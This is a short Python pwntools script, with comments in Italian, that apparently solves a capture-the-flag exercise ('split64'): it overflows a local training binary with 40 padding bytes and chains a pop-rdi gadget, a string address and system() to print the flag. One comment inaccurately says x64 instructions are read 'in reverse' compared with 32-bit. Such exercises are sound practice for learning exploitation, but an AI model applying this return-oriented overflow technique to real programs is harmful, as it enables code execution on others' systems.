from pwn import *

#Setto PWNTools per lavorare  con questo Binario:
elf = context.binary= ELF('split64')

info("%#x system", elf.symbols.system)
system = p64(elf.symbols.system)

printflag = p64(elf.symbols.usefulString)

gadget = p64(0x0000000000400883)

io = process(elf.path)

#Essendo in x64, una volta effettuato il SegmentationFault, le istruzioni saranno lette al contrario rispetto al x32
payload = "A"*40 + gadget + printflag + system
#Mando il payload:
io.sendline(payload)
#Ricevo fin quando non mi dice la stringa:
io.recvuntil("> ")

#Stampo il flag:
flag = io.recvline()
print ("Flag: " + flag)
